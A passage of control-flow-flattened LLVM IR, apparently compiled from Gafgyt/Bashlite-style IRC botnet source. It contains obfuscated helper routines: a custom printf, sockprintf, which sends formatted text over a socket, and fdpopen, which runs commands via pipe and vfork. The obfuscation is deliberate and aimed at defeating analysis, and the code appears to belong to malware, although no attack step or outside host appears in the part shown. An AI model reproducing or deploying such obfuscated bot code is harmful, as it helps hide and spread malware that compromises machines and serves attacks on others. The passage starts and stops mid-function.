  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 -538516914, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 -538516914, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -2060088928, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 272058394, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -2060088928, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 1528036982, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -2035001315, i32 1397640154
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1397640154, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -646539358, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -646539358, label %first
    i32 -587492507, label %16
    i32 -1978905723, label %18
    i32 1857383267, label %23
    i32 585456495, label %26
    i32 -910336149, label %29
    i32 93478747, label %34
    i32 220045087, label %35
    i32 445098642, label %39
    i32 102950954, label %44
    i32 758173327, label %45
    i32 -1054445251, label %46
    i32 814516466, label %51
    i32 1244624048, label %52
    i32 -541001744, label %56
    i32 -1265734434, label %61
    i32 -770141235, label %64
    i32 -1266734466, label %65
    i32 -1660551460, label %66
    i32 1742287285, label %71
    i32 35417611, label %78
    i32 -867581726, label %81
    i32 -1072183555, label %82
    i32 1448819706, label %86
    i32 1792973378, label %91
    i32 1290981974, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -587492507, i32 -1054445251
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -1978905723, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 1857383267, i32 -910336149
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 585456495, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -1978905723, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 93478747, i32 220045087
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 445098642, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 445098642, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 102950954, i32 758173327
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 758173327, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1054445251, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -1266734466, i32 814516466
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1244624048, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -541001744, i32 -770141235
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -1265734434, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 1244624048, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1266734466, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1660551460, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1742287285, i32 -867581726
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 35417611, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1660551460, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1072183555, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1448819706, i32 1290981974
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 1792973378, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1072183555, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1825382710, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1825382710, label %first
    i32 -1539383115, label %26
    i32 -525859761, label %34
    i32 -1604872184, label %38
    i32 -35744635, label %42
    i32 761444136, label %46
    i32 602135093, label %49
    i32 2120347318, label %54
    i32 -248323937, label %58
    i32 -881437312, label %65
    i32 -1593640106, label %71
    i32 -1656153197, label %80
    i32 1776424801, label %84
    i32 853722894, label %88
    i32 1258189336, label %93
    i32 -449195893, label %99
    i32 -180406824, label %102
    i32 -1111882236, label %103
    i32 1902742675, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -1539383115, i32 -525859761
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1902742675, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1604872184, i32 602135093
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -35744635, i32 602135093
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 761444136, i32 602135093
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 602135093, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 2120347318, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -248323937, i32 -1656153197
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -881437312, i32 -1593640106
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -1593640106, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 2120347318, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1776424801, i32 -1111882236
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 853722894, i32 -449195893
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1258189336, i32 -449195893
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -180406824, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -180406824, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1111882236, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1902742675, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 989037549, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 989037549, label %first
    i32 -767105816, label %8
    i32 674154234, label %16
    i32 2090958267, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -767105816, i32 674154234
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 2090958267, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 2090958267, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #4

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #4
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #4
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 658983112, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 658983112, label %first
    i32 1410166654, label %15
    i32 -115994984, label %21
    i32 1795655179, label %28
    i32 822589730, label %29
    i32 884576625, label %34
    i32 -1507217981, label %35
    i32 -831361176, label %39
    i32 -200364595, label %43
    i32 2092260582, label %44
    i32 1691613406, label %54
    i32 183878497, label %55
    i32 -1238847684, label %61
    i32 1567083827, label %NodeBlock
    i32 1474641108, label %LeafBlock1
    i32 960218448, label %LeafBlock
    i32 -430130961, label %66
    i32 -64522873, label %73
    i32 1685966779, label %79
    i32 -614281799, label %84
    i32 1698518723, label %91
    i32 443571440, label %95
    i32 -1043312118, label %100
    i32 -695284395, label %107
    i32 -900157450, label %111
    i32 -445705808, label %NewDefault
    i32 1515768036, label %114
    i32 -253773586, label %120
    i32 434035865, label %126
    i32 -791737537, label %132
    i32 -309260210, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 1410166654, i32 -115994984
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 1795655179, i32 -115994984
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 1795655179, i32 822589730
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #4
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 884576625, i32 -1507217981
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -831361176, i32 -1238847684
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #4
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 -200364595, i32 2092260582
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #4
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 1691613406, i32 183878497
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 -1238847684, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1567083827, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 960218448, i32 1474641108
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -64522873, i32 -445705808
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
